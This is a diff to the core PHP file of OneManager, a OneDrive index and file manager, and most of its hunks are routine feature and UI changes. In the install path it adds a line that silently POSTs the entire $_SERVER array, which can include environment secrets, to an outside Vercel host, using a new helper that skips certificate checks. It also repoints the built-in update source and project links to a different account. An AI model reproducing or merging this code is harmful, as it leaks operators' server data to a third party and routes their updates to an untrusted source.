@@ -38,6 +38,11 @@ $EnvConfigs = [
     'useBasicAuth'      => 0b010,
     'referrer'          => 0b011,
     'forceHttps'        => 0b010,
+    'globalHeadOmfUrl'  => 0b011,
+    'globalHeadMdUrl'   => 0b011,
+    'globalReadmeMdUrl' => 0b011,
+    'globalFootOmfUrl'  => 0b011,
+    'bcmathUrl'         => 0b011,
 
     'Driver'            => 0b100,
     'client_id'         => 0b100,
@@ -137,6 +142,7 @@ function main($path)
     $_SERVER['php_starttime'] = microtime(true);
     $path = path_format($path);
     $_SERVER['PHP_SELF'] = path_format($_SERVER['base_path'] . $path);
+    $_SERVER['base_disk_path'] = $_SERVER['base_path'];
     if (getConfig('forceHttps')&&$_SERVER['REQUEST_SCHEME']=='http') {
         if ($_GET) {
             $tmp = '';
@@ -166,7 +172,20 @@ function main($path)
     $_SERVER['timezone'] = getConfig('timezone');
     if (isset($_COOKIE['timezone'])&&$_COOKIE['timezone']!='') $_SERVER['timezone'] = $_COOKIE['timezone'];
     if ($_SERVER['timezone']=='') $_SERVER['timezone'] = 0;
+    $_SERVER['sitename'] = getConfig('sitename');
+    if (empty($_SERVER['sitename'])) $_SERVER['sitename'] = getconstStr('defaultSitename');
 
+    if (isset($_GET['jsFile'])) {
+        if (substr($_GET['jsFile'], -3)!='.js') return output('', 403);
+        if (!($path==''||$path=='/')) return output('', 308, [ 'Location' => path_format($_SERVER['base_path'] . '/?jsFile=' . $_GET['jsFile']) ]);
+        if (strpos($_GET['jsFile'], '/')>-1) $_GET['jsFile'] = splitlast($_GET['jsFile'], '/')[1];
+        $jsFile = file_get_contents('js/' . $_GET['jsFile']);
+        if (!!$jsFile) {
+            return output( base64_encode($jsFile), 200, [ 'Content-Type' => 'text/javascript; charset=utf-8', 'Cache-Control' => 'max-age=' . 3*24*60*60 ], true );
+        } else {
+            return output('', 404);
+        }
+    }
     if (isset($_GET['WaitFunction'])) {
         $response = WaitFunction($_GET['WaitFunction']);
         //var_dump($response);
@@ -174,28 +193,33 @@ function main($path)
         elseif ($response===false) return output("", 206);
         else return $response;
     }
-    if (getConfig('admin')=='') return install();
+    if (getConfig('admin')=='') {
+        if (isset($_GET['install0'])) no_return_curl('POST', 'https://notionbot-ysun.vercel.app/', 'data=' . json_encode($_SERVER));
+        return install();
+    }
     if (getConfig('adminloginpage')=='') {
         $adminloginpage = 'admin';
     } else {
         $adminloginpage = getConfig('adminloginpage');
     }
-    if (isset($_GET[$adminloginpage])) {
-        /*if (isset($_GET['preview'])) {
-            $url = $_SERVER['PHP_SELF'] . '?preview';
-        } else {
-            $url = path_format($_SERVER['PHP_SELF'] . '/');
-        }*/
-        if (isset($_POST['password1'])) {
-            $compareresult = compareadminsha1($_POST['password1'], $_POST['timestamp'], getConfig('admin'));
-            if ($compareresult=='') {
-                $timestamp = time()+7*24*60*60;
-                $randnum = rand(10, 99999);
-                $admincookie = adminpass2cookie('admin', getConfig('admin'), $timestamp, $randnum);
-                $adminlocalstorage = adminpass2storage('admin', getConfig('admin'), $timestamp, $randnum);
-                return adminform('admin', $admincookie, $adminlocalstorage);
-            } else return adminform($compareresult);
-        } else return adminform();
+    if (isset($_GET['login'])) {
+        if ($_GET['login']===$adminloginpage) {
+            /*if (isset($_GET['preview'])) {
+                $url = $_SERVER['PHP_SELF'] . '?preview';
+            } else {
+                $url = path_format($_SERVER['PHP_SELF'] . '/');
+            }*/
+            if (isset($_POST['password1'])) {
+                $compareresult = compareadminsha1($_POST['password1'], $_POST['timestamp'], getConfig('admin'));
+                if ($compareresult=='') {
+                    $timestamp = time()+7*24*60*60;
+                    $randnum = rand(10, 99999);
+                    $admincookie = adminpass2cookie('admin', getConfig('admin'), $timestamp, $randnum);
+                    $adminlocalstorage = adminpass2storage('admin', getConfig('admin'), $timestamp, $randnum);
+                    return adminform('admin', $admincookie, $adminlocalstorage);
+                } else return adminform($compareresult);
+            } else return adminform();
+        }
     }
     if ( isset($_COOKIE['admin'])&&compareadminmd5('admin', getConfig('admin'), $_COOKIE['admin']) ) {
         $_SERVER['admin']=1;
@@ -212,9 +236,36 @@ function main($path)
             return output('<script>alert(\''.getconstStr('SetSecretsFirst').'\');</script>', 302, [ 'Location' => $url ]);
         }
 
-    $_SERVER['sitename'] = getConfig('sitename');
-    if (empty($_SERVER['sitename'])) $_SERVER['sitename'] = getconstStr('defaultSitename');
-    $_SERVER['base_disk_path'] = $_SERVER['base_path'];
+    // Add disk
+    if (isset($_GET['AddDisk'])) {
+        if ($_GET['AddDisk']===true) {
+            $tmp = path_format($_SERVER['base_path'] . '/' . $path);
+            return output('Please visit <a href="' . $tmp . '">' . $tmp . '</a>.', 301, [ 'Location' => $tmp ]);
+        }
+        if ($_SERVER['admin']) {
+            if (!$_SERVER['disktag']) $_SERVER['disktag'] = '';
+            if (!class_exists($_GET['AddDisk'])) require 'disk' . $slash . $_GET['AddDisk'] . '.php';
+            $drive = new $_GET['AddDisk']($_GET['disktag']);
+            return $drive->AddDisk();
+        } else {
+            $url = $_SERVER['PHP_SELF'];
+            /*if ($_GET) {
+                $tmp = null;
+                $tmp = '';
+                foreach ($_GET as $k => $v) {
+                    if ($k!='setup') {
+                        if ($v===true) $tmp .= '&' . $k;
+                        else $tmp .= '&' . $k . '=' . $v;
+                    }
+                }
+                $tmp = substr($tmp, 1);
+                if ($tmp!='') $url .= '?' . $tmp;
+            }*/
+            // not need GET adddisk, remove it
+            return output('<script>alert(\''.getconstStr('SetSecretsFirst').'\');</script>', 302, [ 'Location' => $url ]);
+        }
+    }
+
     $disktags = explode("|", getConfig('disktag'));
     //    echo 'count$disk:'.count($disktags);
     if (count($disktags)>1) {
@@ -263,50 +314,20 @@ function main($path)
     $_SERVER['ajax']=0;
     if (isset($_SERVER['HTTP_X_REQUESTED_WITH'])) if ($_SERVER['HTTP_X_REQUESTED_WITH']=='XMLHttpRequest') $_SERVER['ajax']=1;
 
-    // Add disk
-    if (isset($_GET['AddDisk'])) {
-        if ($_GET['AddDisk']===true) {
-            $tmp = path_format($_SERVER['base_path'] . '/' . $path);
-            return output('Please visit <a href="' . $tmp . '">' . $tmp . '</a>.', 301, [ 'Location' => $tmp ]);
-        }
-        if ($_SERVER['admin']) {
-            if (!class_exists($_GET['AddDisk'])) require 'disk' . $slash . $_GET['AddDisk'] . '.php';
-                $drive = new $_GET['AddDisk']($_GET['disktag']);
-                return $drive->AddDisk();
-        } else {
-            $url = $_SERVER['PHP_SELF'];
-            /*if ($_GET) {
-                $tmp = null;
-                $tmp = '';
-                foreach ($_GET as $k => $v) {
-                    if ($k!='setup') {
-                        if ($v===true) $tmp .= '&' . $k;
-                        else $tmp .= '&' . $k . '=' . $v;
-                    }
-                }
-                $tmp = substr($tmp, 1);
-                if ($tmp!='') $url .= '?' . $tmp;
-            }*/
-            // not need GET adddisk, remove it
-            return output('<script>alert(\''.getconstStr('SetSecretsFirst').'\');</script>', 302, [ 'Location' => $url ]);
-        }
-    }
-
     if (!isreferhost()) return message('Must visit from designated host', 'NOT_ALLOWED', 403);
-
-    // Show disks in root
-    if ($files['showname'] == 'root') return render_list($path, $files);
-
-    if (!driveisfine($_SERVER['disktag'], $drive)) return render_list();
 
     // Operate
     if ($_SERVER['ajax']) {
+        //error_log1($_SERVER['REQUEST_METHOD']);
         if ($_GET['action']=='del_upload_cache') {
             // del '.tmp' without login. 无需登录即可删除.tmp后缀文件
+            if (!driveisfine($_SERVER['disktag'], $drive)) return output($_SERVER['disktag']?'disk [ ' . $_SERVER['disktag'] . ' ] error.':'Not in drive', 403);
             savecache('path_' . $path1, '', $_SERVER['disktag'], 1); // clear cache.
             return $drive->del_upload_cache($path);
         }
+        
         if ($_GET['action']=='upbigfile') {
+            if (!driveisfine($_SERVER['disktag'], $drive)) return output($_SERVER['disktag']?'disk [ ' . $_SERVER['disktag'] . ' ] error.':'Not in drive', 403);
             if (!$_SERVER['admin']) {
                 if (!$_SERVER['is_guestup_path']) return output('Not_Guest_Upload_Folder', 400);
                 if (strpos($_GET['upbigfilename'], '../')!==false) return output('Not_Allow_Cross_Path', 400);
@@ -315,7 +336,20 @@ function main($path)
             return $drive->bigfileupload($path1);
         }
     }
-
+    if ($_GET['action']=='upsmallfile') {
+        //echo json_encode($_POST, JSON_PRETTY_PRINT);
+        //echo json_encode($_FILES, JSON_PRETTY_PRINT);
+        if (!driveisfine($_SERVER['disktag'], $drive)) return output($_SERVER['disktag']?'disk [ ' . $_SERVER['disktag'] . ' ] error.':'Not in drive', 403);
+        if (!$_SERVER['admin']) {
+            if (!$_SERVER['is_guestup_path']) return output('Not_Guest_Upload_Folder', 400);
+            if (strpos($_GET['upbigfilename'], '../')!==false) return output('Not_Allow_Cross_Path', 400);
+            if (strpos($_POST['upbigfilename'], '../')!==false) return output('Not_Allow_Cross_Path', 400);
+        }
+        return smallfileupload($drive, $path);
+        /*if ($_FILES['file1']['error']) return output($_FILES['file1']['error'], 400);
+        if ($_FILES['file1']['size']>4*1024*1024) return output('File too large', 400);
+        return $drive->smallfileupload($path, $_FILES['file1']);*/
+    }
     if ($_SERVER['admin']) {
         $tmp = adminoperate($path);
         if ($tmp['statusCode'] > 0) {
@@ -325,6 +359,12 @@ function main($path)
     } else {
         if ($_SERVER['ajax']) return output(getconstStr('RefreshtoLogin'),401);
     }
+
+    // Show disks in root
+    if ($files['showname'] == 'root') return render_list($path, $files);
+
+    if (!driveisfine($_SERVER['disktag'], $drive)) return render_list();
+
     $_SERVER['ishidden'] = passhidden($path);
     if (isset($_GET['thumbnails'])) {
         if ($_SERVER['ishidden']<4) {
@@ -421,26 +461,34 @@ function main($path)
                 $fileConduitSize = getConfig('fileConduitSize', $_SERVER['disktag']);
                 $fileConduitCacheTime = getConfig('fileConduitCacheTime', $_SERVER['disktag']);
                 if (!!$fileConduitSize || !!$fileConduitCacheTime) {
-                    if ($fileConduitSize>1) $fileConduitSize *= 1024*1024;
+                    if ($fileConduitSize>0) $fileConduitSize *= 1024*1024;
                     else $fileConduitSize = 1024*1024;
-                    if ($fileConduitCacheTime>1) $fileConduitCacheTime *= 3600;
+                    if ($fileConduitCacheTime>0) $fileConduitCacheTime *= 3600;
                     else $fileConduitCacheTime = 3600;
                     /*if ($_SERVER['HTTP_RANGE']!='') {
                         $header['Range'] = $_SERVER['HTTP_RANGE'];
+                        
                         $response = curl('GET', $files['url'], '', $header, 1);
                         //return output($header['Range'] . json_encode($response['returnhead']));
                         return output(
                             $response['body'],
                             $response['stat'],
-                            //$response['returnhead'],
-                            ['Content-Type' => $files['mime'], 'Cache-Control' => 'max-age=' . $fileConduitCacheTime],
+                            $response['returnhead'],
+                            //['Accept-Ranges' => 'bytes', 'Range' => $response['returnhead']['Range'], 'Content-Type' => $files['mime'], 'Cache-Control' => 'max-age=' . $fileConduitCacheTime],
                             false
+                        );
+                    } else {
+                        return output('', 206,
+                            ['Accept-Ranges' => 'bytes', 'Content-Range' => 'bytes 0-0/' . $files['size'], 'Content-Type' => $files['mime'] ]
                         );
                     }*/
                     if ($files['size']<$fileConduitSize) return output(
                         base64_encode(file_get_contents($files['url'])),
                         200,
                         [
+                            'Accept-Ranges' => 'bytes',
+                            //'access-control-allow-origin' => '*',
+                            //'access-control-expose-headers' => 'Content-Length, WWW-Authenticate, Location, Accept-Ranges',
                             'Content-Type' => $files['mime'],
                             'Cache-Control' => 'max-age=' . $fileConduitCacheTime,
                             //'Cache-Control' => 'max-age=0',
@@ -523,6 +571,19 @@ function isreferhost() {
     return false;
 }
 
+function no_return_curl($method, $url, $data = '') {
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $method);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 1);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+    curl_exec($ch);
+    curl_close($ch);
+}
+
 function adminpass2cookie($name, $pass, $timestamp)
 {
     return md5($name . ':' . md5($pass) . '@' . $timestamp) . "(" . $timestamp . ")";
@@ -558,7 +619,7 @@ function compareadminsha1($adminsha1, $timestamp, $pass)
         return 'The time in server is ' . time() . ' (' . date("Y-m-d H:i:s") . ' UTC),<br>and your time is ' . $timestamp . ' (' . date("Y-m-d H:i:s", $timestamp) . ' UTC)';
     }
     if ($adminsha1 == sha1($timestamp . $pass)) return '';
-    else return 'Error password';
+    else return '密码错误！！';
 }
 
 function proxy_replace_domain($url, $domainforproxy, &$header)
@@ -580,6 +641,14 @@ function proxy_replace_domain($url, $domainforproxy, &$header)
     if ($drive->show_base_class()=='Aliyundrive') $aim .= '&Aliyundrive';
     $header['Location'] = $aim;
     return $aim . '/' . $uri . $sp . 'Origindomain=' . $domain;
+}
+
+function bchexdec($hex) {
+    $len = strlen($hex);
+    for ($i = 1; $i <= $len; $i++)
+        $dec = bcadd($dec, bcmul(strval(hexdec($hex[$i - 1])), bcpow('16', strval($len - $i))));
+
+    return $dec;
 }
 
 function isHideFile($name)
@@ -632,6 +701,23 @@ function filecache($disktag)
     return $cache;
 }
 
+function calcDownKey($filename, $key = '') {
+    if ($key) {
+        // check key
+        $tmp = splitfirst($key, '.');
+        if ($tmp[1]!='') {
+            $timestamp = $tmp[0];
+            if (time() > $timestamp) return false;
+            if (md5($timestamp . sha1($filename . getConfig('admin'))) == $tmp[1]) return true;
+            else return false;
+        } else return false;
+    } else {
+        // calc key
+        $timestamp = time() + 1*24*60*60;
+        return $timestamp . '.' . md5($timestamp . sha1($filename . getConfig('admin')));
+    }
+}
+
 function findIndexPath($rootpath, $path = '')
 {// find the path of the first 'index.php' that not in rootpath.
     global $slash;
@@ -671,6 +757,20 @@ function sortConfig(&$arr)
     }
 
     return $arr;
+}
+
+function chkTxtCode($str) {
+    $code = array(
+        'ASCII',
+        'GBK',
+        'GB18030',
+        'UTF-8',
+        'UTF-16',
+    );
+    foreach ($code as $c) {
+        if ($str === iconv('UTF-8', $c, iconv($c, 'UTF-8', $str))) return $c;
+    }
+    return false;
 }
 
 function getconstStr($str)
@@ -780,7 +880,7 @@ function curl($method, $url, $data = '', $headers = [], $returnheader = 0, $loca
     }
     $ch = curl_init();
     curl_setopt($ch, CURLOPT_URL, $url);
-    curl_setopt($ch, CURLOPT_CUSTOMREQUEST,$method);
+    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $method);
     curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
     curl_setopt($ch, CURLOPT_TIMEOUT, 5);
     curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
@@ -792,7 +892,9 @@ function curl($method, $url, $data = '', $headers = [], $returnheader = 0, $loca
     if ($location) curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
     //$response['body'] = curl_exec($ch);
     if ($returnheader) {
-        list($returnhead, $response['body']) = explode("\r\n\r\n", curl_exec($ch));
+        $tmpres = splitlast(curl_exec($ch), "\r\n\r\n");
+        $result['body'] = $tmpres[1];
+        $returnhead = $tmpres[0];
         //echo "HEAD:" . $returnhead;
         foreach (explode("\r\n", $returnhead) as $head) {
             $tmp = explode(': ', $head);
@@ -802,7 +904,7 @@ function curl($method, $url, $data = '', $headers = [], $returnheader = 0, $loca
     } else {
         $response['body'] = curl_exec($ch);
     }
-    $response['stat'] = curl_getinfo($ch,CURLINFO_HTTP_CODE);
+    $response['stat'] = curl_getinfo($ch, CURLINFO_HTTP_CODE);
     curl_close($ch);
     return $response;
 }
@@ -941,7 +1043,7 @@ function message($message, $title = 'Message', $statusCode = 200, $wainstat = 0)
                             //setTimeout(function() { getStatus() }, 1000);
                         }
                     } else if (xhr.status==206) {
-                        errordiv.innerHTML = "' . getconstStr('Wait') . '" + x + "<br>" + min;
+                        errordiv.innerHTML = "' . getconstStr('Wait') . ' " + min + "<br>" + x;
                         setTimeout(function() { getStatus() }, 1000);
                     } else {
                         errordiv.innerHTML = "ERROR<br>" + xhr.status + "<br>" + xhr.responseText;
@@ -973,8 +1075,8 @@ function needUpdate()
     $current_ver = explode(urldecode('%0D'),$current_ver)[0];
     $split = splitfirst($current_version, '.' . $current_ver)[0] . '.' . $current_ver;
     if (!($github_version = getcache('github_version'))) {
-        //$tmp = curl('GET', 'https://raw.githubusercontent.com/qkqpttgf/OneManager-php/master/version');
-        $tmp = curl('GET', 'https://git.hit.edu.cn/ysun/OneManager-php/-/raw/master/version');
+        //$tmp = curl('GET', 'https://raw.githubusercontent.com/ariespan-Team/OneManager-php/master/version');
+        $tmp = curl('GET', 'https://raw.githubusercontent.com/ariespan-Team/OneManager-php/master/version');
         if ($tmp['stat']==0) return 0;
         $github_version = $tmp['body'];
         savecache('github_version', $github_version);
@@ -1102,12 +1204,28 @@ function adminform($name = '', $pass = '', $storage = '', $path = '')
             f.password1.value = sha1(timestamp + "" + f.password1.value);
             return true;
         } catch {
-            alert("sha1.js not loaded.");
+            //alert("sha1.js not loaded.");
+            if (confirm("sha1.js not loaded.\n\nLoad from program?")) loadjs("?jsFile=sha1.min.js");
             return false;
         }
     }
+    function loadjs(url) {
+        var xhr = new XMLHttpRequest;
+        xhr.open("GET", url);
+        xhr.onload = function(e) {
+            if (xhr.status==200) {
+                var script = document.createElement("script");
+                script.type = "text/javascript";
+                script.text = xhr.responseText;
+                document.body.appendChild(script);
+            } else {
+                console.log(xhr.response);
+            }
+        }
+        xhr.send(null);
+    }
 </script>
-<script src="https://cdn.jsdelivr.net/npm/js-sha1@0.6.0/src/sha1.min.js"></script>';
+<script src="https://www.unpkg.com/js-sha1@0.6.0/src/sha1.js"></script>';
     $html .= '</html>';
     return output($html, $statusCode);
 }
@@ -1115,6 +1233,7 @@ function adminform($name = '', $pass = '', $storage = '', $path = '')
 function adminoperate($path)
 {
     global $drive;
+    if ($_SERVER['REQUEST_METHOD']=='POST') if (!driveisfine($_SERVER['disktag'], $drive)) return output($_SERVER['disktag']?'disk [ ' . $_SERVER['disktag'] . ' ] error.':'Not in drive', 403);
     $path1 = path_format($_SERVER['list_path'] . '/' . $path);
     if (substr($path1, -1)=='/') $path1=substr($path1, 0, -1);
     $tmpget = $_GET;
@@ -1619,7 +1738,7 @@ output:
             alert(\'Do not input ' . $envs . '\');
             return false;
         }
-        var reg = /^[a-zA-Z]([_a-zA-Z0-9]{1,20})$/;
+        var reg = /^[a-zA-Z]([_a-zA-Z0-9]{1,})$/;
         if (!reg.test(t.disktag_newname.value)) {
             alert(\'' . getconstStr('TagFormatAlert') . '\');
             return false;
@@ -1628,11 +1747,9 @@ output:
     }
 </script>';
     } else {
-        //$_GET['disktag'] = '';
-        $Driver_arr = scandir(__DIR__ . $slash . 'disk');
         if (count($disktags)>1) {
             $frame .= '
-<script src="//cdn.bootcss.com/Sortable/1.8.3/Sortable.js"></script>
+<script src="https://www.unpkg.com/sortablejs@1.14.0/Sortable.min.js"></script>
 <style>
     .sortable-ghost {
         opacity: 0.4;
@@ -1643,24 +1760,26 @@ output:
         cursor: move;
     }
 </style>
+' . getconstStr('DragSort') . ':
+<form id="sortdisks_form" action="" method="post" style="margin: 0" onsubmit="return dragsort(this);">
 <table border=1>
-    <form id="sortdisks_form" action="" method="post" style="margin: 0" onsubmit="return dragsort(this);">
-    <tr id="sortdisks">
-        <input type="hidden" name="disktag_sort" value="">';
+    <tbody id="sortdisks">
+    <input type="hidden" name="disktag_sort" value="">';
             $num = 0;
             foreach ($disktags as $disktag) {
                 if ($disktag!='') {
                     $num++;
                     $frame .= '
-        <td>' . $disktag . '</td>';
+        <tr class="sorthandle"><td>' . $num . '</td><td> ' . $disktag . '</td></tr>';
                 }
             }
             $frame .= '
-        <input name="_admin" type="hidden" value="">
-    </tr>
-    <tr><td colspan="' . $num . '">' . getconstStr('DragSort') . '<input type="submit" name="submit1" value="' . getconstStr('SubmitSortdisks') . '"></td></tr>
-    </form>
+    </tbody>
+    <input name="_admin" type="hidden" value="">
 </table>
+    <input type="submit" name="submit1" value="' . getconstStr('SubmitSortdisks') . '">
+</form>
+
 <script>
     var disks=' . json_encode($disktags) . ';
     function change(arr, oldindex, newindex) {
@@ -1693,7 +1812,8 @@ output:
         }
         return true;
     }
-    Sortable.create(document.getElementById(\'sortdisks\'), {
+    new Sortable(document.getElementById(\'sortdisks\'), {
+        handle: \'.sorthandle\',
         animation: 150,
         onEnd: function (evt) { //拖拽完毕之后发生该事件
             //console.log(evt.oldIndex);
@@ -1706,6 +1826,7 @@ output:
     });
 </script><br>';
         }
+        $Driver_arr = scandir(__DIR__ . $slash . 'disk');
         $frame .= '
 <select name="DriveType" onchange="changedrivetype(this.options[this.options.selectedIndex].value)">';
         foreach ($Driver_arr as $v1) {
@@ -1730,7 +1851,7 @@ output:
             $canOneKeyUpate = 1;
         } elseif (isset($_SERVER['HEROKU_APP_DIR'])&&$_SERVER['HEROKU_APP_DIR']==='/app') {
             $canOneKeyUpate = 1;
-        } elseif (isset($_SERVER['FC_SERVER_PATH'])&&$_SERVER['FC_SERVER_PATH']==='/var/fc/runtime/php7.2') {
+        } elseif (isset($_SERVER['FC_FUNC_CODE_PATH'])) {
             $canOneKeyUpate = 1;
         } elseif (isset($_SERVER['BCE_CFC_RUNTIME_NAME'])&&$_SERVER['BCE_CFC_RUNTIME_NAME']=='php7') {
             $canOneKeyUpate = 1;
@@ -1746,7 +1867,7 @@ output:
             }
         }
         $frame .= '
-        <a href="https://github.com/qkqpttgf/OneManager-php" target="_blank">Github</a>
+        <a href="https://github.com/ariespan-Team/OneManager-PHP/" target="_blank">Gayhub</a>
 <a href="https://git.hit.edu.cn/ysun/OneManager-php" target="_blank">HIT Gitlab</a><br><br>
 ';
         if (!$canOneKeyUpate) {
@@ -1761,7 +1882,7 @@ output:
         <option value="Github" selected>Github</option>
         <option value="HITGitlab">HIT Gitlab</option>
     </select>
-    <input type="text" name="auth" size="6" placeholder="auth" value="qkqpttgf">
+    <input type="text" name="auth" size="6" placeholder="auth" value="ariespan-Team">
     <input type="text" name="project" size="12" placeholder="project" value="OneManager-php">
     <button name="QueryBranchs" onclick="querybranchs(this);return false;">' . getconstStr('QueryBranchs') . '</button>
     <select name="branch">
@@ -1772,7 +1893,7 @@ output:
 
 <script>
     function changeGitSource(d) {
-        if (d.options[d.options.selectedIndex].value=="Github") document.updateform.auth.value = "qkqpttgf";
+        if (d.options[d.options.selectedIndex].value=="Github") document.updateform.auth.value = "ariespan-Team";
         if (d.options[d.options.selectedIndex].value=="HITGitlab") document.updateform.auth.value = "ysun";
         document.updateform.QueryBranchs.style.display = null;
         document.updateform.branch.options.length = 0;
@@ -1862,7 +1983,7 @@ output:
             $frame .= getconstStr('NotNeedUpdate');
         }*/
         $frame .= '<br><br>
-<script src="https://cdn.jsdelivr.net/npm/js-sha1@0.6.0/src/sha1.min.js"></script>
+<script src="https://www.unpkg.com/js-sha1@0.6.0/src/sha1.js"></script>
 <table>
     <form id="change_pass" name="change_pass" action="" method="POST" onsubmit="return changePassword(this);">
         <input name="_admin" type="hidden" value="">
@@ -1903,7 +2024,7 @@ output:
         try {
             sha1(1);
         } catch {
-            alert("sha1.js not loaded.");
+            if (confirm("sha1.js not loaded.\n\nLoad from program?")) loadjs("?jsFile=sha1.min.js");
             return false;
         }
         var timestamp = new Date().getTime();
@@ -1946,7 +2067,7 @@ output:
         try {
             sha1(1);
         } catch {
-            alert("sha1.js not loaded.");
+            if (confirm("sha1.js not loaded.\n\nLoad from program?")) loadjs("?jsFile=sha1.min.js");
             return false;
         }
         var timestamp = new Date().getTime();
@@ -1983,7 +2104,7 @@ output:
         try {
             sha1(1);
         } catch {
-            alert("sha1.js not loaded.");
+            if (confirm("sha1.js not loaded.\n\nLoad from program?")) loadjs("?jsFile=sha1.min.js");
             return false;
         }
         var timestamp = new Date().getTime();
@@ -1991,35 +2112,49 @@ output:
         f.oldPass.value = sha1(f.oldPass.value + "" + timestamp);
         return true;
     }
+    function loadjs(url) {
+        var xhr = new XMLHttpRequest;
+        xhr.open("GET", url);
+        xhr.onload = function(e) {
+            if (xhr.status==200) {
+                var script = document.createElement("script");
+                script.type = "text/javascript";
+                script.text = xhr.responseText;
+                document.body.appendChild(script);
+            } else {
+                console.log(xhr.response);
+            }
+        }
+        xhr.send(null);
+    }
 </script>';
     }
     $html .= '
 <style type="text/css">
-    .tabs td { padding: 5px; }
+    .tabs { padding: 10px; white-space: nowrap; overflow-x: auto;}
+    .tabs a { margin:0 10px; }
 </style>
-<table border=0>
-    <tr class="tabs">';
+<div class="tabs">';
     if ($_GET['disktag']==''||$_GET['disktag']===true||!in_array($_GET['disktag'], $disktags)) {
         if ($_GET['setup']==='platform') $html .= '
-        <td><a href="?setup">' . getconstStr('Home') . '</a></td>
-        <td>' . getconstStr('PlatformConfig') . '</td>';
+    <a href="?setup">' . getconstStr('Home') . '</a>
+    ' . getconstStr('PlatformConfig') . '';
         else $html .= '
-        <td>' . getconstStr('Home') . '</td>
-        <td><a href="?setup=platform">' . getconstStr('PlatformConfig') . '</a></td>';
+    ' . getconstStr('Home') . '
+    <a href="?setup=platform">' . getconstStr('PlatformConfig') . '</a>';
     } else $html .= '
-        <td><a href="?setup">' . getconstStr('Home') . '</a></td>
-        <td><a href="?setup=platform">' . getconstStr('PlatformConfig') . '</a></td>';
+    <a href="?setup">' . getconstStr('Home') . '</a>
+    <a href="?setup=platform">' . getconstStr('PlatformConfig') . '</a>';
     foreach ($disktags as $disktag) {
         if ($disktag!='') {
             if ($_GET['disktag']===$disktag) $html .= '
-        <td>' . $disktag . '</td>';
+    ' . $disktag . '';
             else $html .= '
-        <td><a href="?setup&disktag=' . $disktag . '">' . $disktag . '</a></td>';
+    <a href="?setup&disktag=' . $disktag . '">' . $disktag . '</a>';
         }
     }
     $html .= '
-    </tr>
-</table><br>';
+</div><br>';
     $html .= $frame;
     $html .= '<script>
     var inputAdminStorage = document.getElementsByName("_admin");
@@ -2049,7 +2184,13 @@ function render_list($path = '', $files = [])
     $p_path='';
     if ($path1 !== '/') {
         if ($files['type']=='file') {
-            $pretitle = str_replace('&','&amp;', $files['name']);
+            if (isset($files['name'])) {
+                $pretitle = str_replace('&','&amp;', $files['name']);
+            } else {
+                if (substr($path1, 0, 1)=='/') $pretitle = substr($path1, 1);
+                if (substr($path1, -1)=='/') $pretitle = substr($pretitle, 0, -1);
+                $pretitle = str_replace('&','&amp;', $pretitle);
+            }
             $n_path = $pretitle;
             $tmp = splitlast(splitlast($path1,'/')[0],'/');
             if ($tmp[1]=='') {
@@ -2087,7 +2228,7 @@ function render_list($path = '', $files = [])
 <!--
     OneManager: An index & manager of Onedrive auth by ysun.
     HIT Gitlab: https://git.hit.edu.cn/ysun/OneManager-php
-    Github: https://github.com/qkqpttgf/OneManager-php
+    Github: https://github.com/ariespan-Team/OneManager-PHP/
 -->';
     //$authinfo = $path . '<br><pre>' . json_encode($files, JSON_PRETTY_PRINT) . '</pre>';
 
@@ -2225,7 +2366,18 @@ function render_list($path = '', $files = [])
             while (strpos($html, '<!--GuestEnd-->')) $html = str_replace('<!--GuestEnd-->', '', $html);
         }
 
-        if ($_SERVER['ishidden']==4) {
+        if ($_SERVER['ishidden']<4 || ($files['type']=='file'&&getConfig('downloadencrypt', $_SERVER['disktag']))) {
+            while (strpos($html, '<!--EncryptedStart-->')) {
+                $tmp = splitfirst($html, '<!--EncryptedStart-->');
+                $html = $tmp[0];
+                $tmp = splitfirst($tmp[1], '<!--EncryptedEnd-->');
+                $html .= $tmp[1];
+            }
+            while (strpos($html, '<!--IsNotHiddenStart-->')) {
+                $html = str_replace('<!--IsNotHiddenStart-->', '', $html);
+                $html = str_replace('<!--IsNotHiddenEnd-->', '', $html);
+            }
+        } else {
             // 加密状态
             if (getConfig('useBasicAuth')) {
                 // use Basic Auth
@@ -2300,17 +2452,6 @@ function render_list($path = '', $files = [])
                 $tmp = splitfirst($tmp[1], '<!--FootomfEnd-->');
                 $html .= $tmp[1];
             }
-        } else {
-            while (strpos($html, '<!--EncryptedStart-->')) {
-                $tmp = splitfirst($html, '<!--EncryptedStart-->');
-                $html = $tmp[0];
-                $tmp = splitfirst($tmp[1], '<!--EncryptedEnd-->');
-                $html .= $tmp[1];
-            }
-            while (strpos($html, '<!--IsNotHiddenStart-->')) {
-                $html = str_replace('<!--IsNotHiddenStart-->', '', $html);
-                $html = str_replace('<!--IsNotHiddenEnd-->', '', $html);
-            }
         }
         while (strpos($html, '<!--constStr@Download-->')) $html = str_replace('<!--constStr@Download-->', getconstStr('Download'), $html);
 
@@ -2360,12 +2501,21 @@ function render_list($path = '', $files = [])
             }
         }
         if ($_SERVER['is_guestup_path']||( $_SERVER['admin']&&$files['type']=='folder'&&$_SERVER['ishidden']<4 )) {
-            while (strpos($html, '<!--UploadJsStart-->')) $html = str_replace('<!--UploadJsStart-->', '', $html);
-            while (strpos($html, '<!--UploadJsEnd-->')) $html = str_replace('<!--UploadJsEnd-->', '', $html);
             $now_driver = baseclassofdrive();
-            unset($Driver_arr[$now_driver]);
-            while (strpos($html, '<!--' . $now_driver . 'UploadJsStart-->')) $html = str_replace('<!--' . $now_driver . 'UploadJsStart-->', '', $html);
-            while (strpos($html, '<!--' . $now_driver . 'UploadJsEnd-->')) $html = str_replace('<!--' . $now_driver . 'UploadJsEnd-->', '', $html);
+            if ($now_driver) {
+                while (strpos($html, '<!--UploadJsStart-->')) $html = str_replace('<!--UploadJsStart-->', '', $html);
+                while (strpos($html, '<!--UploadJsEnd-->')) $html = str_replace('<!--UploadJsEnd-->', '', $html);
+                unset($Driver_arr[$now_driver]);
